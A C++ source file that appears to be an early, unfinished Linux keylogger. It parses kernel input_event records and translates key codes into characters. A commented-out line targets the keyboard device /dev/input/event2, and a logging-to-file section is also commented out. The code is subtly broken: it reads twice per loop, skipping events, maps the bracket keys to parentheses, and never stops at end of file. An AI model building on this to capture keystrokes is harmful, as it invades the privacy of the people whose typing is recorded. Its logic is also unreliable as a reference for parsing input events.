#include <iostream>
#include <fstream>
#include <vector>
#include <unistd.h> // linux specific C++ files
#include <linux/input-event-codes.h> // code equivalents

// func prototype
std::string getChar(unsigned short code);
void readFile();

int main() {
    std::cout << "Main started" << std::endl;
    readFile();
    std::cout << "Main ended" << std::endl;

    return 0;
}

// 24 bytes in memory is reserved for the event
struct input_event { 
    struct timeval time;    
    unsigned short type;    
    unsigned short code;    
    unsigned int value;     
};

std::string getChar(unsigned short code) {
    std::string c;

    switch (code) {
        case 0:
            c = "RESERVED";
            break;
        case 1:
            c = "ESC";
            break;

        case 2:
            c = '1';
            break;
        case 3:
            c = '2';
            break;
        case 4:
            c = '3';
            break;
        case 5:
            c = '4';
            break;

        case 6:
            c = '5';
            break;
        case 7:
            c = '6';
            break;
        case 8:
            c = '7';
            break;
        case 9:
            c = '8';
            break;

        case 10:
            c = '9';
            break;
        case 11:
            c = '0';
            break;
        case 12:
            c = '-';
            break;
        case 13:
            c = '=';
            break;
        case 14:
            c = "BACKSPACE";
            break;
        case 15:
            c = "TAB";
            break;
        case 16:
            c = 'Q';
            break;
        case 17:
            c = 'W';
            break;
        case 18:
            c = 'E';
            break;
        case 19:
            c = 'R';
            break;
        case 20:
            c = 'T';
            break;
        case 21:
            c = 'Y';
            break;
        case 22:
            c = 'U';
            break;
        case 23:
            c = 'I';
            break;
        case 24:
            c = 'O';
            break;
        case 25:
            c = 'P';
            break;
        case 26:
            c = '(';
            break;
        case 27:
            c = ')';
            break;
        case 28:
            c = "ENTER";
            break;
        case 29:
            c = "LEFT_CTRL";
            break;
        case 30:
            c = 'A';
            break;
        case 31:
            c = 'S';
            break;
        case 32:
            c = 'D';
            break;
        case 33:
            c = 'F';
            break;
        case 34:
            c = 'G';
            break;
        case 35:
            c = 'H';
            break;
        case 36:
            c = 'J';
            break;
        case 37:
            c = 'K';
            break;
        case 38:
            c = 'L';
            break;
        case 39:
            c = ';';
            break;
        case 40:
            c = "'";
            break;
        case 41:
            c = "GRAVE";
            break;
        case 42:
            c = "LEFT_SHIFT";
            break;
        case 43:
            c = "\\";
            break;
        case 44:
            c = 'Z';
            break;
        case 45:
            c = 'X';
            break;
        case 46:
            c = 'C';
            break;
        case 47:
            c = 'V';
            break;
        case 48:
            c = 'B';
            break;
        case 49:
            c = 'N';
            break;
        case 50:
            c = 'M';
            break;
        case 51:
            c = ',';
            break;
        case 52:
            c = '.';
            break;
        case 53:
            c = '/';
            break;
        case 54:
            c = "RIGHT_SHIFT";
            break;
        default: 
            c = "BAD CODE";
            break;
    }

    return c;
}

void readFile() {

    // read the binary file /dev/input/event2
    //std::ifstream keyboardEventFile("keylogger.txt", std::ios::in | std::ios::binary );
    std::ifstream keyboardEventFile("keylogger.txt", std::ios::in);

    if (keyboardEventFile.is_open()) {
        std::cout << "Started reading keyboard file" << std::endl;
        //std::ofstream logger("keylogger.txt"); // file to write to
        int BUFFSIZE = 24;

        char buffer[BUFFSIZE];
        int filePos = 0; // start of the file

        
        // process read as input_event
        keyboardEventFile.seekg(filePos, std::ios::beg);

        while (1) {
            struct input_event newEvent;
            keyboardEventFile.read((char *)&newEvent, sizeof(input_event));
            keyboardEventFile.read(buffer, sizeof(input_event));

            std::cout << "\nCurrent buffer: " << buffer << std::endl;
            /*
            
            // write to output file
            logger.write(cbuff, sizeof(cbuff));
            logger.write("\n", 1);
            */

            std::cout << "New event created.\n"
                << "Time (sec):\t" << newEvent.time.tv_sec
                << "\nType:\t" << newEvent.type
                << "\nCode:\t" << newEvent.code << "\tTranslated:\t" << getChar(newEvent.code)
                << "\nValue:\t" << newEvent.value
                << std::endl;
            // setting the next spot to read from
            std::cout 
                << "Read " << sizeof(input_event) 
                << " bytes at " << filePos
                << std::endl;
            
            filePos += sizeof(input_event);
            keyboardEventFile.seekg(filePos, std::ios::beg);
            sleep(1);   
        }
        keyboardEventFile.close();
    };
}
